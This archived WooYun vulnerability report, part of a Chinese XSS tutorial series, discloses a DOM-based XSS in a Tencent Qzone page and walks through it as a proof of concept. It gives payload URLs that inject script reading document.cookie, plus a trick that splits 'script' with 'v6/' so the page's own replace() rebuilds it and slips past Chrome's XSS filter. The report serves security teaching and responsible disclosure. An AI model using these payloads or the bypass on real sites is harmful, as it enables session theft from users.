@@ -1,0 +1,277 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		[腾讯实例教程] 那些年我们一起学XSS - 18. XSS过滤器绕过 [猥琐绕过]  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		[腾讯实例教程] 那些年我们一起学XSS - 18. XSS过滤器绕过 [猥琐绕过]  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/心伤的瘦子">心伤的瘦子</a> 
+</li><li>提交时间：		2012-12-29 22:15</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-12-29：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-12-31：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-01-10：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-01-20：	细节向普通白帽子公开<br/>
+									2013-01-30：	细节向实习白帽子公开<br/>
+									2013-02-12：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">有些时候，通用的绕过技巧并不可行，这个时候我们就得观察缺陷点的周围环境，想想其它办法咯。“猥琐绕过”与通用绕过不同的是，它通用性小，往往只是特例。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 直接看实例点：<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://qzs.qq.com/qzone/v6/custom/custom_module_proxy.html#siDomain=1&amp;g_StyleID=aaaaaaaaaa</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+2. 可以看出，这是一个DOM XSS的点。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/2919473918e3ffe552063de159d974e45bda9f69.jpg" target="_blank"><img src="../images/2919473918e3ffe552063de159d974e45bda9f69.jpg" alt="95.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+3. 我们看看源码。<br />
+<br />
+<br />
+<br />
+</p><pre><code>....<br />
+var siDomain = paras[&#039;siDomain&#039;],<br />
+	g_StyleID = paras[&#039;g_StyleID&#039;].replace(&quot;v6/&quot;,&quot;&quot;);<br />
+	if(siDomain.indexOf(&quot;.qq.com&quot;)&gt;-1){//防止qzs.qq.com<br />
+		siDomain = paras[&#039;siDomain&#039;] = &quot;qzonestyle.gtimg.cn&quot;;<br />
+	}<br />
+	document.write(&#039;&lt;link href=&quot;http://&#039;+siDomain+&#039;/qzone_v6/gb/skin/&#039;+g_StyleID+&#039;.css&quot; rel=&quot;stylesheet&quot; /&gt;&lt;link href=&quot;http://&#039;+siDomain+&#039;/qzone_v6/home_normal.css&quot; rel=&quot;stylesheet&quot; /&gt;&#039;);<br />
+...</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+不难看出，siDomain与g_StyleID都是地址栏里获取过来，然后通过document.write输出到页面中。<br />
+<br />
+<br />
+<br />
+4. 利用先前教程的知识，我们不难构造出利用代码。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://qzs.qq.com/qzone/v6/custom/custom_module_proxy.html#siDomain=1&amp;g_StyleID=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+可以看到，IE下成功弹出。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/29194807212cba0ae56ebb82ae31cc674312812e.jpg" target="_blank"><img src="../images/29194807212cba0ae56ebb82ae31cc674312812e.jpg" alt="96.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+5. 但是到了chrome下，又被拦截了。。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/29194822a240c052bf552b7b76bcb59eac069126.jpg" target="_blank"><img src="../images/29194822a240c052bf552b7b76bcb59eac069126.jpg" alt="97.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+6. 这个时候怎么办呢？ 因为这里接受地址栏的参数时，是以 &quot;=&quot; 分割，因而我们的代码中是不允许携带 等号的。故上一篇的技巧不能拿到这里来使用了！<br />
+<br />
+<br />
+<br />
+7. chrome拦截，是有一定的拦截规则的，只有它觉得是恶意代码的才会去拦截。这个时候，就需要我们“观察地形”啦！！<br />
+<br />
+<br />
+<br />
+我们仔细看看这句。<br />
+<br />
+<br />
+<br />
+</p><pre><code>g_StyleID = paras[&#039;g_StyleID&#039;].replace(&quot;v6/&quot;,&quot;&quot;);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+8. 不难看出，这里会对g_StyleID进行一次替换，将v6/替换为空。那么如果我们的g_StyleID写为下面的情况<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;scrv6/ipt&gt;alert(document.cookie)&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+经过替换后，就会变成。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+但是chrome并不会把&lt;scrv6/ipt&gt;alert(document.cookie)&lt;/script&gt; 当作恶意的，是不是就可以绕过了？<br />
+<br />
+<br />
+<br />
+我们试试。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://qzs.qq.com/qzone/v6/custom/custom_module_proxy.html#siDomain=1&amp;g_StyleID=&quot;&gt;&lt;scv6/ript&gt;alert(document.cookie)&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+果然可以～<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/291948357c9e1f3273171fe18eea631c0d770ca5.jpg" target="_blank"><img src="../images/291948357c9e1f3273171fe18eea631c0d770ca5.jpg" alt="98.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+这样一来，我们这个XSS，就不会被浏览器的XSS过滤器所蹂躏啦！<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详细说明 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">进入document.write前，先过滤下 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/心伤的瘦子" title="心伤的瘦子">心伤的瘦子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-016678" title="[腾讯实例教程] 那些年我们一起学XSS - 18. XSS过滤器绕过 [猥琐绕过]">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2012-12-31 09:58</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="16678";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
